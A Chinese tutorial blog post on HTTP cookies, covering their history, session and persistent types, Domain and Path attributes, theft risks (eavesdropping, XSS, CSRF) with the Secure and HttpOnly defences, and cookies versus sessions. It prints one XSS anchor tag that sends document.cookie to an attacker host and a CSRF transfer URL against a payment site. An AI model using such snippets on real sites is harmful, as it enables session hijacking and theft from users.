# 前言
网络早期最大的问题之一是如何管理状态。简而言之，服务器无法知道两个请求是否来自同一个浏览器。当时最简单的方法是在请求时，在页面中插入一些参数，并在下一个请求中传回参数。这需要使用包含参数的隐藏的表单，或者作为URL参数的一部分传递。这两个解决方案都手动操作，容易出错。

网景公司当时一名员工Lou Montulli，在1994年将“cookies”的概念应用于网络通信，用来解决用户网上购物的购物车历史记录，目前所有浏览器都支持cookies。

# cookie是什么
cookie翻译过来是“饼干，甜品”的意思，cookie在网络应用中到处存在，当我们浏览之前访问过的网站，网页中可能会显示：你好，王三少，这就会让我们感觉很亲切，像吃了一块很甜的饼干一样。

由于http是无状态的协议，一旦客户端和服务器的数据交换完毕，就会断开连接，再次请求，会重新连接，这就说明服务器单从网络连接上是没有办法知道用户身份的。怎么办呢？那就给每次新的用户请求时，给它颁发一个身份证（独一无二）吧，下次访问，必须带上身份证，这样服务器就会知道是谁来访问了，针对不同用户，做出不同的响应。，这就是Cookie的原理。

其实cookie是一个很小的文本文件，是浏览器储存在用户的机器上的。Cookie是纯文本，没有可执行代码。储存一些服务器需要的信息，每次请求站点，会发送相应的cookie，这些cookie可以用来辨别用户身份信息等作用。

# cookie的类型
可以按照过期时间分为两类：会话cookie和持久cookie。会话cookie是一种临时cookie，用户退出浏览器，会话Cookie就会被删除了，持久cookie则会储存在硬盘里，保留时间更长，关闭浏览器，重启电脑，它依然存在，通常是持久性的cookie会维护某一个用户周期性访问服务器的配置文件或者登录信息

持久cookie 设置一个特定的过期时间（Expires）或者有效期（Max-Age）

`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2019 07:28:00 GMT;`

# cookie的属性
## cookie的域
产生Cookie的服务器可以向set-Cookie响应首部添加一个Domain属性来控制哪些站点可以看到那个cookie，例如下面：
`Set-Cookie: name="wang"; domain="www.xxx.com"`
如果用户访问的是www.xxx.com那就会发送cookie: name="wang", 如果用户访问www.aaa.com（非www.xxx.com）就不会发送这个Cookie。

## cookie的路径 Path
Path属性可以为服务器特定文档指定Cookie，这个属性设置的url且带有这个前缀的url路径都是有效的。
例如：www.xxx.com 和 www.xxx.com/user/这两个url。www.xxx.com 设置cookie
```
Set-cookie: id="123432";domain="www.xxx.com";
```
www.xxx.com/user/ 设置cookie：

```
Set-cookie：user="wang", domain="www.xxx.com"; path=/user/
```

但是访问其他路径www.xxx.com/other/就会获得

```
cookie: id="123432"
```
如果访问v/user/就会获得

```
cookie: id="123432"
cookie: user="wang"
```

# 安全
多数网站使用cookie作为用户会话的唯一标识，因为其他的方法具有限制和漏洞。如果一个网站使用cookies作为会话标识符，攻击者可以通过窃取一套用户的cookies来冒充用户的请求。从服务器的角度，它是没法分辨用户和攻击者的，因为用户和攻击者拥有相同的身份验证。 下面介绍几种cookie盗用和会话劫持的例子：

## 网络窃听
网络上的流量可以被网络上任何计算机拦截，特别是未加密的开放式WIFI。这种流量包含在普通的未加密的HTTP清求上发送Cookie。在未加密的情况下，攻击者可以读取网络上的其他用户的信息，包含HTTP Cookie的全部内容，以便进行中间的攻击。比如：拦截cookie来冒充用户身份执行恶意任务（银行转账等）。

解决办法：服务器可以设置secure属性的cookie，这样就只能通过https的方式来发送cookies了。

## 跨站点脚本XSS
使用跨站点脚本技术可以窃取cookie。当网站允许使用javascript操作cookie的时候，就会发生攻击者发布恶意代码攻击用户的会话，同时可以拿到用户的cookie信息。

例子：
```html
<a href="#" onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`>领取红包</a>
```

当用户点击这个链接的时候，浏览器就会执行onclick里面的代码，结果这个网站用户的cookie信息就会被发送到abc.com攻击者的服务器。攻击者同样可以拿cookie搞事情。

解决办法：可以通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代码将不能操作cookie。

## 跨站请求伪造CSRF
CSRF（Cross Site Request Forgery） 跨站请求伪造。也被称为One Click Attack和Session Riding，通常缩写为CSRF或XSRF。如果从名字你还不不知道它表示什么，你可以这样理解：攻击者（黑客，钓鱼网站）盗用了你的身份，以你的名义发送恶意请求，这些请求包括发送邮件、发送消息、盗取账号、购买商品、银行转账，从而使你的个人隐私泄露和财产损失。

### CSRF攻击实例
听了这么多，可能大家还云里雾里，光听概念可能大家对于CSRF还是不够了解，下面我将举一个例子来让大家对CSRF有一个更深层次的理解。
我们先假设支付宝存在CSRF漏洞，我的支付宝账号是lyq，攻击者的支付宝账号是xxx。然后我们通过网页请求的方式 http://zhifubao.com/withdraw?account=lyq&amount=10000&for=lyq2 可以把我账号lyq的10000元转到我的另外一个账号lyq2上去。通常情况下，该请求发送到支付宝服务器后，服务器会先验证该请求是否来自一个合法的session并且该session的用户已经成功登陆。攻击者在支付吧也有账号xxx，他知道上文中的URL可以进行转账操作，于是他自己可以发送一个请求 http://zhifubao.com/withdraw?account=lyq&amount=10000&for=xxx 到支付宝后台。但是这个请求是来自攻击者而不是来自我lyq，所以不能通过安全认证，因此该请求作废。这时，攻击者xxx想到了用CSRF的方式，他自己做了个黄色网站，在网站中放了如下代码：http://zhifubao.com/withdraw?account=lyq&amount=10000&for=xxx 并且通过黄色链接诱使我来访问他的网站。当我禁不住诱惑时就会点了进去，上述请求就会从我自己的浏览器发送到支付宝，而且这个请求会附带我的浏览器中的cookie。大多数情况下，该请求会失败，因为支付宝要求我的认证信息，但是我如果刚访问支付宝不久，还没有关闭支付宝页面，我的浏览器中的cookie存有我的认证信息，这个请求就会得到响应
，从我的账户中转10000元到xxx账户里，而我丝毫不知情，攻击者拿到钱后逍遥法外。所以以后一定要克制住自己，不要随便打开别人的链接

# Cookie与Session的区别
* cookie数据存放在客户的浏览器上，session数据放在服务器上；
* cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗，考虑到安全应当使用session；
* session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能。考虑到减轻服务器性能方面，应当使用COOKIE；
* 单个cookie在客户端的限制是3K，就是说一个站点在客户端存放的COOKIE不能超过3K；
Cookie和Session的方案虽然分别属于客户端和服务端，但是服务端的session的实现对客户端的cookie有依赖关系的，上面我讲到服务端执行session机制时候会生成session的id值，这个id值会发送给客户端，客户端每次请求都会把这个id值放到http请求的头部发送给服务端，而这个id值在客户端会保存下来，保存的容器就是cookie，因此当我们完全禁掉浏览器的cookie的时候，服务端的session也会不能正常使用（注意：有些资料说ASP解决这个问题，当浏览器的cookie被禁掉，服务端的session任然可以正常使用，ASP我没试验过，但是对于网络上很多用php和jsp编写的网站，我发现禁掉cookie，网站的session都无法正常的访问）。